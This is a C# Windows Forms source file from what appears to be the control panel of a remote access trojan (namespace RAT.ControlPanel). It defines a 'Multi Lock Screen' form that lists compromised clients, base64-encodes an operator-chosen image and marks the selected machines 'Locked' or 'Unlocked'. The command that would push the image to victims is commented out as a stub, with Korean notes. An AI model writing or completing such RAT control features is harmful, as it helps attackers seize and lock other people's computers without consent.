using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Threading.Tasks;
using Newtonsoft.Json;
using RAT.Shared.Models;

namespace RAT.ControlPanel.Forms
{
    public partial class frmMultiLockScreen : Form
    {
        private List<ClientInfo> clients;
        private MainForm mainForm;
        
        public frmMultiLockScreen(List<ClientInfo> clients, MainForm mainForm)
        {
            this.clients = clients;
            this.mainForm = mainForm;
            InitializeComponent();
            this.Text = $"Multi Lock Screen - {clients.Count} Clients";
        }
        
        private void frmMultiLockScreen_Load(object sender, EventArgs e)
        {
            SetupListView();
            lblStatus.Text = $"Clients: {clients.Count}";
        }
        
        private void SetupListView()
        {
            listViewClients.Items.Clear();
            
            for (int i = 0; i < clients.Count; i++)
            {
                var client = clients[i];
                var item = new ListViewItem((i + 1).ToString());
                item.SubItems.Add(client.ClientId);
                item.SubItems.Add("Unlocked");
                item.Tag = client;
                item.Checked = false;
                
                listViewClients.Items.Add(item);
            }
        }
        
        private void btnSelectImage_Click(object sender, EventArgs e)
        {
            using (var ofd = new OpenFileDialog())
            {
                ofd.Filter = "Image Files|*.png;*.jpg;*.jpeg;*.bmp";
                ofd.Title = "Select Lock Screen Image";
                
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtImagePath.Text = ofd.FileName;
                    
                    // 미리보기 표시
                    try
                    {
                        pictureBoxPreview.Image = Image.FromFile(ofd.FileName);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show($"Failed to load image: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
        }
        
        private async void btnLock_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(txtImagePath.Text) || !File.Exists(txtImagePath.Text))
            {
                MessageBox.Show("Please select a valid image file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            
            var checkedClients = GetCheckedClients();
            if (checkedClients.Count == 0)
            {
                MessageBox.Show("Please select at least one client.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            
            // 이미지를 Base64로 변환
            string imageBase64 = ImageToBase64(txtImagePath.Text);
            
            foreach (var client in checkedClients)
            {
                // 명령 전송 (실제 구현에서는 mainForm을 통해 전송)
                // await SendCommand(client, new { type = "ui_wallpaper_base64", image = imageBase64 });
                
                UpdateClientStatus(client.ClientId, "Locked");
            }
            
            MessageBox.Show($"Lock screen sent to {checkedClients.Count} client(s).", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            await Task.CompletedTask;
        }
        
        private async void btnUnlock_Click(object sender, EventArgs e)
        {
            var checkedClients = GetCheckedClients();
            if (checkedClients.Count == 0)
            {
                MessageBox.Show("Please select at least one client.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            
            foreach (var client in checkedClients)
            {
                // 명령 전송 (실제 구현에서는 mainForm을 통해 전송)
                // await SendCommand(client, new { type = "ui_wallpaper", path = "" }); // 원래 배경화면 복원
                
                UpdateClientStatus(client.ClientId, "Unlocked");
            }
            
            MessageBox.Show($"Unlock sent to {checkedClients.Count} client(s).", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            await Task.CompletedTask;
        }
        
        private void btnCheckAll_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listViewClients.Items)
            {
                item.Checked = true;
            }
        }
        
        private void btnUncheckAll_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listViewClients.Items)
            {
                item.Checked = false;
            }
        }
        
        private List<ClientInfo> GetCheckedClients()
        {
            var checkedClients = new List<ClientInfo>();
            
            foreach (ListViewItem item in listViewClients.CheckedItems)
            {
                if (item.Tag is ClientInfo client)
                {
                    checkedClients.Add(client);
                }
            }
            
            return checkedClients;
        }
        
        private void UpdateClientStatus(string clientId, string status)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => UpdateClientStatus(clientId, status)));
                return;
            }
            
            foreach (ListViewItem item in listViewClients.Items)
            {
                if (item.Tag is ClientInfo client && client.ClientId == clientId)
                {
                    item.SubItems[2].Text = status;
                    break;
                }
            }
        }
        
        private string ImageToBase64(string imagePath)
        {
            try
            {
                byte[] imageBytes = File.ReadAllBytes(imagePath);
                return Convert.ToBase64String(imageBytes);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to convert image: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return string.Empty;
            }
        }
    }
}
